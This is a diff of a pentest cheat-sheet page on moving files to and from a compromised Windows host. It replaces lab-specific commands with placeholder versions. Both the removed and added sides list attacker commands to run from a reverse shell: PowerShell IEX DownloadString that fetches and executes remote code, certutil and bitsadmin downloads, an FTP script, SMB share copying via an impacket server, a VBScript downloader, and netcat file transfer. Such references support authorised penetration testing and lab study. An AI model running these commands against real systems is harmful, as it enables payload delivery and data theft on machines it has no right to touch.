@@ -1,97 +1,30 @@
 # Windows
 
-```
-# PowerShell
-powershell.exe wget http://172.20.1.6/file.exe -OutFile file.exe
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://172.20.1.6/file.exe','file.exe')
-powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.1.7/poc.txt')
-obs: DownloadString will download the file and execute the string inside the txt
-
-# Bitsadmin
-bitsadmin /transfer mydownloadjob /download /priority normal http:///xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
-
-# certutil
-certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat
-
-# Powershell
-(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
-invoke-webrequest -Uri http://10.10.14.19:9090/PowerUp.ps1 -OutFile powerup.ps1
-
-# FTP
-# In reverse shell" 
-echo open 10.11.1.111 > ftp.txt)
-echo USER anonymous >> ftp.txt
-echo ftp >> ftp.txt 
-echo bin >> ftp.txt
-echo GET file >> ftp.txt
-echo bye >> ftp.txt
-# Execute
+<pre><code><strong># FTP 
+</strong>echo open &#x3C;IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET &#x3C;FILE> >> ftp.txt echo bye>> ftp.txt
 ftp -v -n -s:ftp.txt
 
-# SMB Server
-# Attack machine
-python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111" -u usuario -p pass
-python /usr/share/doc/python3-impacket/examples/smbserver.py Lab "/root/htb/169-resolute/smb"
+# SMB
+copy \\&#x3C;IP>\&#x3C;PATH>\&#x3C;FILE> # Linux -> Windows
+copy &#x3C;FILE> \\&#x3C;IP>\&#x3C;PATH>\ # Windows -> Linux
 
-# Or SMB service 
-# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
-    vim /etc/samba/smb.conf
-        [global]
-        workgroup = WORKGROUP
-        server string = Samba Server %v
-        netbios name = indishell-lab
-        security = user
-        map to guest = bad user
-        name resolve order = bcast host
-        dns proxy = no
-        bind interfaces only = yes
+# Powershell
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('&#x3C;URL>', '&#x3C;DESTINATION_FILE>')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('&#x3C;URL>')
+powershell "wget &#x3C;URL>"
 
-        [ica]
-        path = /var/www/html/pub
-        writable = no
-        guest ok = yes
-        guest only = yes
-        read only = yes
-        directory mode = 0555
-        force user = nobody
+# Python
+python.exe -c "from urllib import urlretrieve; urlretrieve('&#x3C;URL>', '&#x3C;DESTINATION_FILE>')"
 
-    chmod -R 777 smb_path
-    chown -R nobody:nobody smb_path
-    service smbd restart 
+# CertUtil
+certutil.exe -urlcache -split -f "&#x3C;URL>"
 
-# Victim machine with reverse shell
-# Download: copy \\10.11.1.111\Lab\wce.exe . 
-# Upload: copy wtf.jpg \\10.11.1.111\Lab
+# NETCAT
+nc -lvp 1234 > &#x3C;OUT_FILE> 
+nc &#x3C;IP> 1234 &#x3C; &#x3C;IN_FILE>
 
-# VBScript
-# In reverse shell
-echo strUrl = WScript.Arguments.Item(0) > wget.vbs
-echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
-echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
-echo Err.Clear >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
-echo http.Open "GET",strURL,False >> wget.vbs
-echo http.Send >> wget.vbs
-echo varByteArray = http.ResponseBody >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
-echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
-echo strData = "" >> wget.vbs
-echo strBuffer = "" >> wget.vbs
-echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
-echo Next >> wget.vbs
-echo ts.Close >> wget.vbs
-# Execute
-cscript wget.vbs http://10.11.1.111/file.exe file.exe
-```
+# CURL
+curl &#x3C;URL> -o &#x3C;OUT_FILE>
+</code></pre>
 
 [PreviousReverse Shells](https://pentestbook.six2dez.com/exploitation/reverse-shells)[Next](https://pentestbook.six2dez.com/post-exploitation/linux)
